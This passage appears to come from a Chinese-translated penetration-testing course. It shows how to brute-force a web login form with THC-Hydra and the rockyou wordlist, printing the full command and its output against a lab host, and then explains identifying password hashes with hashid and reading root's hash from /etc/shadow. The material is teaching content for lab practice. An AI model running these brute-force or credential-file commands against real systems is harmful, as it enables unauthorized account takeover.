
以下参数是可选的：

- `C=/page/uri` 用于定义不同的页面以收集初始 cookie
- `(h|H)=My-Hdr: foo` 用于在每个请求中发送用户定义的 HTTP 头
- `USER[64]` 和 `PASS[64]` 也可以放入这些头中！

注意：无论 Hydra 是否已经在发送该头，`'h'` 都会在末尾添加用户定义的 HTTP 头。如果该头已存在，`'H'` 将用用户提供的值替换该头的值，或者在末尾添加该头。请注意，如果你要在头中使用冒号（`:`），应该用反斜杠进行转义。所有不是选项分隔符的冒号都应该转义（参见上面的示例）。你可以指定头而不转义冒号，但这样你无法在头值本身中包含冒号，因为它们会被 Hydra 解释为选项分隔符。

**列表 610 - 关于 http-form-post 模块的附加信息**

从这个输出中，我们确定需要提供一组参数，这要求我们执行一些应用程序发现。首先，我们需要 Windows 客户端上包含 Web 表单的网页的 IP 地址和 URL。IP 地址将作为 Hydra 的第一个参数提供。

接下来，我们必须通过检查相关网页（位于 `/form/login.html`）的 HTML 代码来理解我们要进行暴力破解的 Web 表单。

图 294 显示了在页面中右键单击并选择上下文菜单中的**查看页面源代码**后目标 Web 表单的代码：

![](img/ec25e59d75726b7041242a56d3376832_577_0.png)

上述表单是 `/form/login.html` 页面的一部分，它表明 POST 请求由 `/form/frontpage.php` 处理，这是我们要传递给 Hydra 的 URL。列表 610 中显示的语法需要表单参数，在本案中是 `user` 和 `pass`。由于我们使用字典攻击管理员用户登录，传递给 Hydra 的组合参数变为 `/form/frontpage.php:user=admin&pass=^PASS^`，其中 `^PASS^` 充当字典文件条目的占位符。

![](img/ec25e59d75726b7041242a56d3376832_578_0.png)

我们还必须提供条件字符串以指示登录尝试不成功时的情况。这可以通过尝试几次手动登录来找到。在我们的示例中，如图 295 所示，网页返回文本“INVALID LOGIN”。

![](img/ec25e59d75726b7041242a56d3376832_578_1.png)

将这些部分组合起来，我们可以完成 http-form-post 语法，如列表 611 所示。

```bash
http-form-post "/form/frontend.php:user=admin&pass=^PASS^:INVALID LOGIN"
```

**列表 611 - 指定 http-form-post 语法**

现在可以执行完整命令了。我们将提供管理员用户名（`-l admin`）和字典文件（`-P`），使用 `-vV` 请求详细输出，并使用 `-f` 在找到第一个成功结果时停止攻击。此外，我们将提供服务模块名称（`http-form-post`）及其所需参数（`"/form/frontend.php:user=admin&pass=^PASS^:INVALID LOGIN"`），如列表 612 所示：

```bash
kali@kali:~$ hydra 10.11.0.22 http-form-post "/form/frontend.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
Hydra v8.8 (c) 2019 by van Hauser/THC – Please do not use in military or secret service

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-07 15:55:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:i:p/14344399)
[DATA] attacking http-post-form://10.11.0.22/form/frontend.php:user=admin&pass=^PASS^:INVALID LOGIN
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "123456" - 1 of 14344399 [child 0]
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "12345" - 2 of 14344399 [child 1]
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "123456789" - 3 of 14344399 [child 2]
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "password" - 4 of 14344399 [child 3]
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4]
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "princess" - 6 of 14344399 [child 5]
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "1234567" - 7 of 14344399 [child 6]
....
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "karina" - 268 of 14344399 [child 1]
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "dookie" - 269 of 14344399 [child 2]
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "hotmail1" - 270 of 14344399 [child 3]
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "0123456789" - 271 of 14344399 [child 4]
[80][http-post-form] host: 10.11.0.22   login: admin   password: crystal
[STATUS] attack finished for 10.11.0.22 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-07 15:55:29
```

**列表 612 - 使用 THC-Hydra 攻击 Web 表单**

虽然这需要对该应用程序进行一些调查，但结果是值得的，因为发现了一个有效密码。Hydra 附带提供的其他服务模块也值得花精力去掌握。

## 19.3.4.1 *练习*

（这些练习不需要报告）

- 对你的 Windows 客户端上的 Web 表单运行 HTTP POST 密码攻击。
- 对你本地 Kali Linux 机器上的 Pure-FTPD 应用程序执行 FTP 密码攻击。

## 19.4 利用密码哈希

接下来，我们将注意力转移到专注于使用*密码哈希*的攻击。

加密*哈希函数* [562] 是一种单向函数，实现一种算法，该算法给定任意数据块，返回一个固定大小的位字符串，称为“哈希值”或“消息摘要”。加密哈希函数最重要的用途之一是在密码验证中的应用。

### 19.4.1 *检索密码哈希*

大多数使用密码认证机制的系统需要在本地机器上存储这些密码。为了提高安全性，现代认证机制通常以哈希形式存储密码，而不是明文存储。这对操作系统、网络硬件等均是如此。这意味着在认证过程中，用户提供的密码会被哈希化，并与之前存储的消息摘要进行比较。

在没有有关生成哈希的程序或机制的更多信息的情况下，确定确切的哈希类型可能具有挑战性，有时甚至不可能。*Openwall 网站* [563] 可以帮助识别各种密码哈希的来源。在尝试识别消息摘要类型时，需要考虑三个重要的哈希属性。这些包括哈希的长度、哈希中使用的字符集以及哈希中使用的任何特殊字符。

一个有助于哈希类型识别的有用工具是 **hashid** [564]。要使用它，我们只需运行该工具并粘贴我们要识别的哈希：

```bash
kali@kali:~$ hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
Analyzing 'c43ee559d69bc7f691fe2fbfe8a5ef0a'
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RipeMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] Radmin v2.x
```

[562] (Wikipedia, 2019), https://en.wikipedia.org/wiki/Cryptographic_hash_function
[563] (Openwall, 2019), http://openwall.info/wiki/john/sample-hashes
[564] (Pspanda, 2015), https://pspanda.github.io/hashID/

![](img/ec25e59d75726b7041242a56d3376832_580_0.png)

```bash
kali@kali:~$ hashid '$6$l5bL6XIA$sL8wwUD$bxCc$TlbhTH76wE.b1G6aMYSeDXKQ8$7JNFwa1s1kK7and6ZsqQKAF3G6tHD9bd59e5Naz/s7DQcAoJRTWnpZX0'
Analyzing '$6$l5bL6XIA$sL8wwUD$bxCc$TlbhTH76wE.b1G6aMYSeDXKQ8$7JNFwa1s1kK7and6ZsqQKAF3G6tHD9bd59e5Naz/s7DQcAoJRTWnpZX0'
[+] SHA-512 Crypt
```

**列表 613 - 使用 hashid 识别可能的哈希格式**

在上述列表中，我们分析了两个不同的哈希。虽然第一个示例返回了多个可能的匹配项，但第二个将哈希类型缩小为 **SHA-512 Crypt**。

接下来，让我们在我们的 Kali Linux 系统中检索并分析一些哈希。许多 Linux 系统将在**/etc/shadow** 文件中存储用户密码哈希，该文件需要 root 权限才能读取：

```bash
kali@kali:~$ sudo grep root /etc/shadow
root:$6$Rw99z2TBSAZwfboPwMG6z2t1BeK.EL74sivuCva8YhrCGX6oVdeYUGsf8iwNxJcr.wTLDj5Ipo$yaGuCLawTg/gewQKo7jT/:17564:0:99999:7:::
```

**列表 614 - 取自我们 Kali Linux /etc/shadow 文件的 root 用户哈希**

在列表 614 中，该行以用户名（`root`）开头，后跟密码哈希。哈希分为子字段，第一个（`$6`）引用 SHA-512 [565] 算法。下一个子字段是*盐值* [566]，它与明文密码一起用于创建密码哈希。盐值是一个随机值，与明文密码一起用于计算密码哈希。这防止了哈希查找攻击 [567]，因为密码哈希将根据盐值而变化。

> 攻击者可以在哈希表中存储不同字典文件的预计算哈希值。[568] 这些表可能消耗数 TB 的存储空间，具体取决于预计算密码的数量，但可用于快速映射（查找）哈希到明文密码。加盐增加了在计算实际哈希之前密码值的随机化，大大降低了这种攻击成功的几率。

[565] (Slashroot, 2013), https://www.slashroot.in/how-are-passwords-stored-linux-understanding-hashing-shadow-utils
[566] (Wikipedia, 2019), https://en.wikipedia.org/wiki/Salt_(cryptography)
[567] (nets.ca, 2012), https://nets.ca/Cryptography
[568] (Wikipedia, 2019), https://en.wikipedia.org/wiki/Hash_table

